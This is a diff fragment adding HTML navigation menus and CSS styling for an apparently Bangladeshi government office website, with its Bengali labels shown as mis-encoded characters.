+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¡à¦¾à¦• à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—" href="/bn/site/page/qLXV-à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—"
+                                    style="color: ">à¦¡à¦¾à¦• à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦…à¦¨à¦²à¦¾à¦‡à¦¨ à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—" href="/bn/site/page/qLXV-à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—"
+                                    style="color: ">à¦…à¦¨à¦²à¦¾à¦‡à¦¨ à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                                            </ul>
+                        </div>
+                                                                                                
+
+                        
+                        <!-- Sub-Menu Color Admin Custom Start -->
+                            <!--  -->
+                            <!--  -->
+                                                                                    
+                                                                                            <!-- 1  -->
+                                                        
+                                                                                            <!-- 1  -->
+                                                    <!-- Sub-Menu Color Admin Custom End -->
+						
+                        <div class="one-col">
+                                                                                            <a title="à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦— à¦®à§à¦¯à¦¾à¦ª" href="/bn/site/page/qLXV-à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—">
+                                    <h6 style="background:; color: ;  font-size: 16px!important;">à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦— à¦®à§à¦¯à¦¾à¦ª</h6>
+                                </a>
+                                                        
+                            <ul class="mzr-links">
+                                                            </ul>
+                        </div>
+                                                </div>
+                    </div>
+                </li>
+                                                
+                <!-- Menu Color Admin Custom Start -->
+                    <!--  -->
+                    <!--  -->
+                                                            
+                                                                    <!-- 1  -->
+                                        
+                                                                    <!-- 1  -->
+                                    <!-- Menu Color Admin Custom End -->
+                
+                <li class="mzr-drop menu-link  c7  focusin-drop focusClassDrop" style="background:">
+                    <a href="#" title="à¦®à¦¤à¦¾à¦®à¦¤" style="color: ">à¦®à¦¤à¦¾à¦®à¦¤</a>
+                    <div class="sub-menu mzr-content " >
+                        <div class="five-col">
+                                                                                                
+
+                        
+                        <!-- Sub-Menu Color Admin Custom Start -->
+                            <!--  -->
+                            <!--  -->
+                                                                                    
+                                                                                            <!-- 1  -->
+                                                        
+                                                                                            <!-- 1  -->
+                                                    <!-- Sub-Menu Color Admin Custom End -->
+						
+                        <div class="one-col">
+                                                                                            <a title="à¦®à¦¤à¦¾à¦®à¦¤ à¦“ à¦ªà¦°à¦¾à¦®à¦°à§à¦¶" href="/bn/#">
+                                    <h6 style="background:; color: ;  font-size: 16px!important;">à¦®à¦¤à¦¾à¦®à¦¤ à¦“ à¦ªà¦°à¦¾à¦®à¦°à§à¦¶</h6>
+                                </a>
+                                                        
+                            <ul class="mzr-links">
+                                                            </ul>
+                        </div>
+                                                </div>
+                    </div>
+                </li>
+                            </ul>
+        </div>
+        <div class="mob_menu d-block d-md-none" id="jmenu">
+            <a href="javascript:;" class="show-menu menu-head" title=" à¦®à§‡à¦¨à§ à¦¨à¦¿à¦°à§à¦¬à¦¾à¦šà¦¨ à¦•à¦°à§à¦¨">
+                <i class="fas fa-bars"></i>
+                <span style="margin-left:10px;"> à¦®à§‡à¦¨à§ à¦¨à¦¿à¦°à§à¦¬à¦¾à¦šà¦¨ à¦•à¦°à§à¦¨ </span>
+            </a>
+            <div role="navigation" id="dawgdrops">
+                <ul class="meganizr mzr-slide mzr-responsive mb-3" style="display: none;">
+                    <li class="col0 home"><a href=/bn></a></li>
+                    					                    <li class="mzr-drop col1">
+                        <a title="à¦†à¦®à¦¾à¦¦à§‡à¦° à¦¸à¦®à§à¦ªà¦°à§à¦•à§‡">à¦†à¦®à¦¾à¦¦à§‡à¦° à¦¸à¦®à§à¦ªà¦°à§à¦•à§‡</a>
+                        <div class="mzr-content sibling-toggle" style="display:none">
+                            							                            <div class="one-col">
+                                <h6>à¦œà¦¨à¦¬à¦²</h6>
+                                <ul class="mzr-links">
+                                    
+                                    									
+                                    <li><a title="à¦•à¦°à§à¦®à¦•à¦°à§à¦¤à¦¾" href="/bn/site/officer_list/à¦®à§‹à¦ƒ-à¦°à¦¾à¦•à¦¿à¦¬à§à¦²-à¦¹à¦¾à¦¸à¦¾à¦¨">à¦•à¦°à§à¦®à¦•à¦°à§à¦¤à¦¾</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦…à¦«à¦¿à¦¸ à¦ªà§à¦°à¦§à¦¾à¦¨" href="/bn/site/officer_list/à¦®à§‹à¦ƒ-à¦°à¦¾à¦•à¦¿à¦¬à§à¦²-à¦¹à¦¾à¦¸à¦¾à¦¨">à¦…à¦«à¦¿à¦¸ à¦ªà§à¦°à¦§à¦¾à¦¨</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦ªà§à¦°à¦¾à¦•à§à¦¤à¦¨ à¦…à¦«à¦¿à¦¸ à¦ªà§à¦°à¦¾à¦§à¦¨à¦—à¦£" href="/bn/site/officer_list/XcrQ-à¦®à§‹à¦¹à¦¾à¦®à§à¦®à¦¾à¦¦-à¦¹à¦¾à¦¸à§‡à¦®-à¦†à¦²à§€">à¦ªà§à¦°à¦¾à¦•à§à¦¤à¦¨ à¦…à¦«à¦¿à¦¸ à¦ªà§à¦°à¦¾à¦§à¦¨à¦—à¦£</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦¤à¦¥à§à¦¯ à¦ªà§à¦°à¦¦à¦¾à¦¨à¦•à¦¾à¦°à§€ à¦•à¦°à§à¦®à¦•à¦°à§à¦¤à¦¾" href="/bn/site/info_officer/à¦®à§‹à¦ƒ-à¦°à¦¾à¦•à¦¿à¦¬à§à¦²-à¦¹à¦¾à¦¸à¦¾à¦¨">à¦¤à¦¥à§à¦¯ à¦ªà§à¦°à¦¦à¦¾à¦¨à¦•à¦¾à¦°à§€ à¦•à¦°à§à¦®à¦•à¦°à§à¦¤à¦¾</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦¸à¦¾à¦‚à¦—à¦ à¦¨à¦¿à¦• à¦•à¦¾à¦ à¦¾à¦®à§‹" href="/bn/site/page/04F2-à¦¸à¦¾à¦‚à¦—à¦ à¦¨à¦¿à¦•-à¦•à¦¾à¦ à¦¾à¦®à§‹">à¦¸à¦¾à¦‚à¦—à¦ à¦¨à¦¿à¦• à¦•à¦¾à¦ à¦¾à¦®à§‹</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦•à¦°à§à¦®à¦šà¦¾à¦°à§€à¦¬à§ƒà¦¨à§à¦¦" href="/bn/site/staff_list/à¦®à§‹à¦ƒ-à¦†à¦²-à¦†à¦®à¦¿à¦¨">à¦•à¦°à§à¦®à¦šà¦¾à¦°à§€à¦¬à§ƒà¦¨à§à¦¦</a></li>
+
+                                                                    </ul>
+                            </div>
+                            							                            <div class="one-col">
+                                <h6>à¦…à¦«à¦¿à¦¸ à¦¸à¦®à§à¦ªà¦°à§à¦•à¦¿à¦¤</h6>
+                                <ul class="mzr-links">
+                                    
+                                    									
+                                    <li><a title="à¦à¦• à¦¨à¦œà¦°à§‡" href="/bn/site/page/à¦à¦•-à¦¨à¦œà¦°à§‡">à¦à¦• à¦¨à¦œà¦°à§‡</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦†à¦®à¦¾à¦¦à§‡à¦° à¦…à¦°à§à¦œà¦¨à¦¸à¦®à§‚à¦¹" href="/bn/site/page/à¦†à¦®à¦¾à¦¦à§‡à¦°-à¦…à¦°à§à¦œà¦¨à¦¸à¦®à§‚à¦¹">à¦†à¦®à¦¾à¦¦à§‡à¦° à¦…à¦°à§à¦œà¦¨à¦¸à¦®à§‚à¦¹</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦¸à¦¾à¦®à§à¦ªà§à¦°à¦¤à¦¿à¦• à¦•à¦°à§à¦®à¦•à¦¾à¦¨à§à¦¡" href="/bn/site/page/à¦¸à¦¾à¦®à§à¦ªà§à¦°à¦¤à¦¿à¦•-à¦•à¦°à§à¦®à¦•à¦¾à¦¨à§à¦¡">à¦¸à¦¾à¦®à§à¦ªà§à¦°à¦¤à¦¿à¦• à¦•à¦°à§à¦®à¦•à¦¾à¦¨à§à¦¡</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦­à¦¬à¦¿à¦·à§à¦¯à§Ž à¦ªà¦°à¦¿à¦•à¦²à§à¦ªà¦¨à¦¾" href="/bn/#">à¦­à¦¬à¦¿à¦·à§à¦¯à§Ž à¦ªà¦°à¦¿à¦•à¦²à§à¦ªà¦¨à¦¾</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦˜à¦Ÿà¦¨à¦¾à¦ªà§à¦žà§à¦œ" href="/bn/#">à¦˜à¦Ÿà¦¨à¦¾à¦ªà§à¦žà§à¦œ</a></li>
+
+                                                                    </ul>
+                            </div>
+                                                    </div>
+                    </li>
+                    					                    <li class="mzr-drop col2">
+                        <a title="à¦†à¦®à¦¾à¦¦à§‡à¦° à¦¸à§‡à¦¬à¦¾">à¦†à¦®à¦¾à¦¦à§‡à¦° à¦¸à§‡à¦¬à¦¾</a>
+                        <div class="mzr-content sibling-toggle" style="display:none">
+                            							                            <div class="one-col">
+                                <h6>à¦¡à¦¾à¦‰à¦¨à¦²à§‹à¦¡</h6>
+                                <ul class="mzr-links">
+                                    
+                                    									
+                                    <li><a title="à¦¬à¦¿à¦­à¦¾à¦—à§€à§Ÿ à¦†à¦‡à¦¨" href="http://bdlaws.minlaw.gov.bd">à¦¬à¦¿à¦­à¦¾à¦—à§€à§Ÿ à¦†à¦‡à¦¨</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦¬à¦¿à¦§à¦¿à¦®à¦¾à¦²à¦¾" href="//bangladesh.gov.bd/site/view/policy">à¦¬à¦¿à¦§à¦¿à¦®à¦¾à¦²à¦¾</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦ªà¦°à¦¿à¦ªà¦¤à§à¦° / à¦¨à§€à¦¤à¦¿à¦®à¦¾à¦²à¦¾" href="//bangladesh.gov.bd/site/view/policy">à¦ªà¦°à¦¿à¦ªà¦¤à§à¦° / à¦¨à§€à¦¤à¦¿à¦®à¦¾à¦²à¦¾</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦—à¦¾à¦°à§à¦¡à¦«à¦¾à¦‡à¦²" href="//bangladesh.gov.bd/site/view/gurd_files_category">à¦—à¦¾à¦°à§à¦¡à¦«à¦¾à¦‡à¦²</a></li>
+
+                                                                    </ul>
+                            </div>
+                            							                            <div class="one-col">
+                                <h6>à¦¸à§‡à¦¬à¦¾à¦¸à¦®à§‚à¦¹</h6>
+                                <ul class="mzr-links">
+                                    
+                                    									
+                                    <li><a title="à¦¸à§‡à¦¬à¦¾à¦° à¦¤à¦¾à¦²à¦¿à¦•à¦¾" href="/bn/#">à¦¸à§‡à¦¬à¦¾à¦° à¦¤à¦¾à¦²à¦¿à¦•à¦¾</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦¸à§‡à¦¬à¦¾à¦•à§à¦žà§à¦œ" href="//services.portal.gov.bd">à¦¸à§‡à¦¬à¦¾à¦•à§à¦žà§à¦œ</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦¸à¦¿à¦Ÿà¦¿à¦œà§‡à¦¨ à¦šà¦¾à¦°à§à¦Ÿà¦¾à¦°" href="/bn/#">à¦¸à¦¿à¦Ÿà¦¿à¦œà§‡à¦¨ à¦šà¦¾à¦°à§à¦Ÿà¦¾à¦°</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦•à§€ à¦¸à§‡à¦¬à¦¾ à¦•à§€à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦¬à§‡à¦¨" href="/bn/site/page/à¦¸à§‡à¦¬à¦¾-à¦ªà§à¦°à¦¾à¦ªà§à¦¤à¦¿à¦°-à¦§à¦¾à¦ªà¦¸à¦®à§‚à¦¹">à¦•à§€ à¦¸à§‡à¦¬à¦¾ à¦•à§€à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦¬à§‡à¦¨</a></li>
+
+                                                                    </ul>
+                            </div>
+                            							                            <div class="one-col">
+                                <h6>à¦ªà¦°à¦¿à¦¦à¦°à§à¦¶à¦¨</h6>
+                                <ul class="mzr-links">
+                                    
+                                    									
+                                    <li><a title="à¦‡à¦‰à¦¨à¦¿à§Ÿà¦¨ à¦…à¦«à¦¿à¦¸ à¦ªà¦°à¦¿à¦¦à¦¶à¦¨" href="/bn/#">à¦‡à¦‰à¦¨à¦¿à§Ÿà¦¨ à¦…à¦«à¦¿à¦¸ à¦ªà¦°à¦¿à¦¦à¦¶à¦¨</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦ªà§à¦°à¦•à¦²à§à¦ª à¦ªà¦°à¦¿à¦¦à¦°à§à¦¶à¦¨" href="/bn/#">à¦ªà§à¦°à¦•à¦²à§à¦ª à¦ªà¦°à¦¿à¦¦à¦°à§à¦¶à¦¨</a></li>
+
+                                                                    </ul>
+                            </div>
+                                                    </div>
+                    </li>
+                    					                    <li class="mzr-drop col3">
+                        <a title="à¦Šà¦°à§à¦§à§à¦¬à¦¤à¦¨ à¦…à¦«à¦¿à¦¸">à¦Šà¦°à§à¦§à§à¦¬à¦¤à¦¨ à¦…à¦«à¦¿à¦¸</a>
+                        <div class="mzr-content sibling-toggle" style="display:none">
+                            							                            <div class="one-col">
+                                <h6>à¦¬à¦¿à¦­à¦¾à¦—/à¦œà§‡à¦²à¦¾</h6>
+                                <ul class="mzr-links">
+                                    
+                                    									
+                                    <li><a title="à¦¬à¦¿à¦­à¦¾à¦—à§€à§Ÿ à¦•à¦¾à¦°à§à¦¯à¦¾à¦²à§Ÿ" href="//ansarvdp.rajshahidiv.gov.bd/">à¦¬à¦¿à¦­à¦¾à¦—à§€à§Ÿ à¦•à¦¾à¦°à§à¦¯à¦¾à¦²à§Ÿ</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦œà§‡à¦²à¦¾ à¦•à¦¾à¦°à§à¦¯à¦¾à¦²à§Ÿ" href="//ansarvdp.bogra.gov.bd">à¦œà§‡à¦²à¦¾ à¦•à¦¾à¦°à§à¦¯à¦¾à¦²à§Ÿ</a></li>
+
+                                                                    </ul>
+                            </div>
+                            							                            <div class="one-col">
+                                <h6>à¦®à¦¨à§à¦¤à§à¦°à¦£à¦¾à¦²à§Ÿ/à¦¦à¦ªà§à¦¤à¦°</h6>
+                                <ul class="mzr-links">
+                                    
+                                    									
+                                    <li><a title="à¦®à¦¨à§à¦¤à§à¦°à¦£à¦¾à¦²à§Ÿ/à¦¬à¦¿à¦­à¦¾à¦—" href="//mha.gov.bd">à¦®à¦¨à§à¦¤à§à¦°à¦£à¦¾à¦²à§Ÿ/à¦¬à¦¿à¦­à¦¾à¦—</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦…à¦§à¦¿à¦¦à¦ªà§à¦¤à¦°" href="//ansarvdp.gov.bd">à¦…à¦§à¦¿à¦¦à¦ªà§à¦¤à¦°</a></li>
+
+                                                                    </ul>
+                            </div>
+                                                    </div>
+                    </li>
+                    					                    <li class="mzr-drop col4">
+                        <a title="à¦‡-à¦¸à§‡à¦¬à¦¾">à¦‡-à¦¸à§‡à¦¬à¦¾</a>
+                        <div class="mzr-content sibling-toggle" style="display:none">
+                            							                            <div class="one-col">
+                                <h6>à¦œà¦¾à¦¤à§€à§Ÿ à¦‡-à¦¸à§‡à¦¬à¦¾</h6>
+                                <ul class="mzr-links">
+                                    
+                                    									
+                                    <li><a title="à¦¨à¦¥à¦¿" href="//www.nothi.gov.bd/login">à¦¨à¦¥à¦¿</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦‡-à¦¤à¦¥à§à¦¯ à¦•à§‹à¦·" href="http://www.infokosh.gov.bd">à¦‡-à¦¤à¦¥à§à¦¯ à¦•à§‹à¦·</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦‡-à¦®à§‹à¦¬à¦¾à¦‡à¦² à¦•à§‹à¦°à§à¦Ÿ" href="//ecourt.gov.bd">à¦‡-à¦®à§‹à¦¬à¦¾à¦‡à¦² à¦•à§‹à¦°à§à¦Ÿ</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦­à§‚à¦®à¦¿ à¦¸à§‡à¦¬à¦¾" href="//land.gov.bd">à¦­à§‚à¦®à¦¿ à¦¸à§‡à¦¬à¦¾</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦¬à¦¾à¦‚à¦²à¦¾à¦¦à§‡à¦¶ à¦«à¦°à¦®" href="http://www.forms.gov.bd">à¦¬à¦¾à¦‚à¦²à¦¾à¦¦à§‡à¦¶ à¦«à¦°à¦®</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦¸à§‡à¦¬à¦¾à¦•à§à¦žà§à¦œ" href="//services.portal.gov.bd">à¦¸à§‡à¦¬à¦¾à¦•à§à¦žà§à¦œ</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦…à¦¨à¦²à¦¾à¦‡à¦¨ à¦†à¦¬à§‡à¦¦à¦¨" href="//nothi.gov.bd/dak_nagoriks/NagorikAbedon">à¦…à¦¨à¦²à¦¾à¦‡à¦¨ à¦†à¦¬à§‡à¦¦à¦¨</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦‰à¦¤à§à¦¤à¦°à¦¾à¦§à¦¿à¦•à¦¾à¦° à¦•à§à¦¯à¦¾à¦²à¦•à§à¦²à§‡à¦Ÿà¦°" href="//xn--d5by7bap7cc3ici3m.xn--54b7fta0cc">à¦‰à¦¤à§à¦¤à¦°à¦¾à¦§à¦¿à¦•à¦¾à¦° à¦•à§à¦¯à¦¾à¦²à¦•à§à¦²à§‡à¦Ÿà¦°</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦‡-à¦¬à§à¦•" href="http://www.ebook.gov,bd">à¦‡-à¦¬à§à¦•</a></li>
+
+                                                                    </ul>
+                            </div>
+                            							                            <div class="one-col">
+                                <h6>à¦®à§‹à¦¬à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦ª</h6>
+                                <ul class="mzr-links">
+                                    
+                                    									
+                                    <li><a title="à¦¨à¦¥à¦¿ (à¦à¦¨à¦¡à§à¦°à§Ÿà§‡à¦¡)" href="//play.google.com/store/apps/details?id=com.tappware.nothipro">à¦¨à¦¥à¦¿ (à¦à¦¨à¦¡à§à¦°à§Ÿà§‡à¦¡)</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦¨à¦¥à¦¿ (à¦†à¦‡ à¦«à§‹à¦¨)" href="//apps.apple.com/us/app/nothi/id1187955540">à¦¨à¦¥à¦¿ (à¦†à¦‡ à¦«à§‹à¦¨)</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦¬à¦¾à¦‚à¦²à¦¾à¦¦à§‡à¦¶-à¦¡à¦¿à¦°à§‡à¦•à§à¦Ÿà¦°à¦¿ (à¦à¦¨à¦¡à§à¦°à§Ÿà§‡à¦¡)" href="//play.google.com/store/apps/details?id=com.tappware.ned&amp;hl=en">à¦¬à¦¾à¦‚à¦²à¦¾à¦¦à§‡à¦¶-à¦¡à¦¿à¦°à§‡à¦•à§à¦Ÿà¦°à¦¿ (à¦à¦¨à¦¡à§à¦°à§Ÿà§‡à¦¡)</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦¬à¦¾à¦‚à¦²à¦¾à¦¦à§‡à¦¶ à¦ªà¦°à§à¦¯à¦Ÿà¦¨ (à¦à¦¨à¦¡à§à¦°à§Ÿà§‡à¦¡)" href="//play.google.com/store/apps/details?id=com.tappware.bts&amp;hl=en">à¦¬à¦¾à¦‚à¦²à¦¾à¦¦à§‡à¦¶ à¦ªà¦°à§à¦¯à¦Ÿà¦¨ (à¦à¦¨à¦¡à§à¦°à§Ÿà§‡à¦¡)</a></li>
+
+                                                                    </ul>
+                            </div>
+                                                    </div>
+                    </li>
+                    					                    <li class="mzr-drop col5">
+                        <a title="à¦—à§à¦¯à¦¾à¦²à¦¾à¦°à¦¿">à¦—à§à¦¯à¦¾à¦²à¦¾à¦°à¦¿</a>
+                        <div class="mzr-content sibling-toggle" style="display:none">
+                            							                            <div class="one-col">
+                                <h6>à¦«à¦Ÿà§‹ à¦—à§à¦¯à¦¾à¦²à¦¾à¦°à¦¿</h6>
+                                <ul class="mzr-links">
+                                                                    </ul>
+                            </div>
+                            							                            <div class="one-col">
+                                <h6>à¦­à¦¿à¦¡à¦¿à¦“ à¦—à§à¦¯à¦¾à¦²à¦¾à¦°à¦¿</h6>
+                                <ul class="mzr-links">
+                                                                    </ul>
+                            </div>
+                                                    </div>
+                    </li>
+                    					                    <li class="mzr-drop col6">
+                        <a title="à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—">à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—</a>
+                        <div class="mzr-content sibling-toggle" style="display:none">
+                            							                            <div class="one-col">
+                                <h6>à¦…à¦«à¦¿à¦¸ à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—</h6>
+                                <ul class="mzr-links">
+                                    
+                                    									
+                                    <li><a title="à¦¡à¦¾à¦• à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—" href="/bn/site/page/qLXV-à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—">à¦¡à¦¾à¦• à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—</a></li>
+
+                                    
+                                    									
+                                    <li><a title="à¦…à¦¨à¦²à¦¾à¦‡à¦¨ à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—" href="/bn/site/page/qLXV-à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—">à¦…à¦¨à¦²à¦¾à¦‡à¦¨ à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—</a></li>
+
+                                                                    </ul>
+                            </div>
+                            							                            <div class="one-col">
+                                <h6>à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦— à¦®à§à¦¯à¦¾à¦ª</h6>
+                                <ul class="mzr-links">
+                                                                    </ul>
+                            </div>
+                                                    </div>
+                    </li>
+                    					                    <li class="mzr-drop col7">
+                        <a title="à¦®à¦¤à¦¾à¦®à¦¤">à¦®à¦¤à¦¾à¦®à¦¤</a>
+                        <div class="mzr-content sibling-toggle" style="display:none">
+                            							                            <div class="one-col">
+                                <h6>à¦®à¦¤à¦¾à¦®à¦¤ à¦“ à¦ªà¦°à¦¾à¦®à¦°à§à¦¶</h6>
+                                <ul class="mzr-links">
+                                                                    </ul>
+                            </div>
+                                                    </div>
+                    </li>
+                                    </ul>
+            </div>
+        </div>
+    </div>
+</div>
+<div id="skip-main-content-start-here" style="opacity:0;font-size:1px;">Main Comtent Skiped</div>
+<style>
+    .mzr-responsive li.col0 {
+        display: block!important;
+    }
+    .meganizr .drop-five-columns {
+        width: 700px;
+    }
+    /*==================================
+    Menubar Broken Design css fix
+    ===================================*/
+    .meganizr .mzr-content{ width: 172px;}
+    li.c1 .mzr-content{ width: 680px;}
+    li.c2 .mzr-content{ width: 680px;}
+    li.c3 .mzr-content{ width: 680px;}
+    li.c4 .mzr-content{ width: 680px;margin-left: -110px!important;}
+    li.c5 .mzr-content{ width: 680px;margin-left: -120px!important;}
+    li.c6 .mzr-content{ width: 510px;margin-left: -140px!important;}
+    li.c7 .mzr-content{ width: 340px;margin-left: -120px!important;}
+    li.c8 .mzr-content{ width: 340px;margin-left: -120px!important;}
+    
+    
+    .meganizr .five-col {
+        width: 700px;
+    }
+    .menu .sub-menu .mzr-links a{
+        padding: 5px 0px!important;    
+    }
+    /* .menu .home {
+        display: flex;
+        align-items: center;
+    }
+    
+    .menu .home a {
+        
+        height: 100%;
+        background-repeat: no-repeat;
+        background-position: center;
+    } */
+
+    /* .menu .sub-menu {
+        position: absolute;
+        z-index: 600;
+        padding: 10px 0;
+        left: 0px;
+        opacity: 0;
+        overflow: hidden;
+        display: none;
+        background-color: #ffffff;
+        border: 1px solid #dedede;
+        width: 100%;
+    } */
+
+    .menu .mzr-drop:hover .sub-menu {
+        display: flex;
+        opacity: 1;
+    }
+
+    /* .menu .sub-menu>div {
+        width: 150px;
+        margin: 10px;
+        font-size: 14px;
+        line-height: 21px;
+    } */
+
+    .menu .sub-menu>div h6 {
+        font-weight: bold;
+        margin-bottom: 4px;
+        /* padding: 3px 7px; */
+    }
+
+    .menu .sub-menu .mzr-links a {
+        display: block;
+        padding: 5px 7px;
+        line-height: 20px;
+        border-bottom: 1px dotted #e1e1e1;
+        font-size: 15px;
+    }
+
+    .menu .sub-menu .mzr-links a:hover {
+        color: #333;
+        background-color: #eee;
+    }
+
+    .menu ul.menu-container {
+        background-color: #fafafa;
+        border-bottom: 1px dotted #cccccc;
+        font-size: 12px;
+        position: relative;
+        display: flex;
+    }
+
+    .menu li {
+        list-style: none;
+    }
+
+    .menu li.menu-link {
+        border-right: 1px dotted #ccc;
+    }
+
+    .menu a {
+        position: relative;
+        z-index: 550;
+        display: block;
+        padding: 11px 15px 11px 15px;
+        font-size: 16px!important;
+        text-shadow: 0px 1px 1px white;
+        transition: color 0.15s ease-in, background-image 0.2s linear 0.15s;
+        margin: 0;
+        cursor: pointer;
+    }
+
+    .row .menu a:hover {
+        color: #000;
+        /* background-color: #000000; */
+        text-decoration: none;
+    }
+
+    .menu .c1:hover >a {
+        background-color: #ff6600;
+        color: #fff;
+    }
+
+    .menu .c1>a,
+    .menu .c1 h6 {
+        color: #ff6600;
+    }
+
+    .menu .c1 .sub-menu {
+        border-top: #ff6600 solid 8px;
+    }
+
+    .menu .c2:hover >a {
+        background-color: #c40a2a;
+         color: #fff;
+    }
+
+    .menu .c2>a,
+    .menu .c2 h6 {
+        color: #c40a2a;
+    }
+
+    .menu .c2 .sub-menu {
+        border-top: #c40a2a solid 8px;
+    }
+
+    .menu .c3 .sub-menu {
+        border-top: #84154d solid 8px;
+    }
+
+    .menu .c3:hover >a {
+        background-color: #84154d;
+         color: #fff;
+    }
+
+    .menu .c3>a,
+    .menu .c3 h6 {
+        color: #84154d;
+    }
+
+    .menu .c3 .sub-menu {
+        border-top: #84154d solid 8px;
+    }
+
+    .menu .c4 .sub-menu {
+        border-top: #098346 solid 8px;
+    }
+
+    .menu .c4:hover >a {
+        background-color: #098346;
+        color: #fff;
+    }
+
+    .menu .c4>a,
+    .menu .c4 h6 {
+        color: #098346;
+    }
+
+    .menu .c5 .sub-menu {
+        border-top: #1399be solid 8px;
+    }
+
+    .menu .c5 .sub-menu {
+        border-top: #1399be solid 8px;
+    }
+
+    .menu .c5:hover >a {
+        background-color: #1399be;
+         color: #fff;
+    }
+
+    .menu .c5>a,
+    .menu .c5 h6 {
+        color: #1399be;
+    }
+
+    .menu .c5 .sub-menu {
+        border-top: #1399be solid 8px;
+    }
+
+    .menu .c6 .sub-menu {
+        border-top: #8768de solid 8px;
+    }
+
+    .menu .c6 .sub-menu {
+        border-top: #8768de solid 8px;
+    }
+
+    .menu .c6:hover >a {
+        background-color: #8768de;
+         color: #fff;
+    }
+
+    .menu .c6>a,
+    .menu .c6 h6 {
+        color: #8768de;
+    }
+
+    .menu .c6 .sub-menu {
+        border-top: #8768de solid 8px;
+    }
+
+    .mob_menu {
+        background: #fafafa;
+        height: 40px;
+        margin-bottom: 10px;
+    }
+
+    .mob_menu a.show-menu {
+        background-repeat: no-repeat !important;
+        padding-left: 5px;
+        background-color: #fafafa;
+        line-height: 40px;
+        display: block;
+        background-position: -3px 0;
+    }
+
+    .mob_menu a.show-menu:focus,
+    .mob_menu a.show-menu:visited {
+        text-decoration: none !important
+    }
+    
+    .menu ul.menu-container {
+        
+        display: inline-block!important;
+    }
+    
+    .meganizr .one-col, .meganizr .two-col, .meganizr .three-col, .meganizr .four-col, .meganizr .five-col, .meganizr .six-col {
+        float: left;
+        margin: 5px!important;
+    }
+    
+    
+    @media print{
+        .menu .sub-menu{
+            display: none !important;    
+        }    
+    }
+	
+	
+ul.mzr-links li > ul{
+	margin-left: 15px;
+}
+
+ul.mzr-links li > ul li a{
+	font-size: 14px !important;
+	display:block;
+	padding: 0 10px;
+}
+
+
+
+    
+    /*--------------------- add new css------------------------- */
+    .menu .sub-menu .mzr-links a:focus-within {
+         text-decoration: none !important;
+    }
+    .menu .focusin-drop:focus-within .sub-menu {
+        display: flex;
+        opacity: 1;
+    }
+    .focusin-drop:focus-within .mzr-content {
+	    border-top: none !important;
+    }
+    .meganizr > li.focusin-drop:focus-within > a {
+        z-index: 650;
+    }
+    .meganizr > li.focusin-drop:focus-within > a:after {
+        position: absolute;
+        content: '';
+        top: 0;
+        left: 0;
+        width: 100%;
+    }
+    
+    .meganizr > li.focusin-drop:focus-within > a:after,
+	.meganizr > li.focusin-drop > a.mzr-click:after {
+		position: absolute;
+		content: '';
+		top: 0;
+		left: 0;
+		width: 100%;
+
+	}
+	
+
+	.meganizr > li.focusin-drop:focus-within > a,
+	.meganizr > li.focusin-drop > a.mzr-click { z-index: 650;}
+	
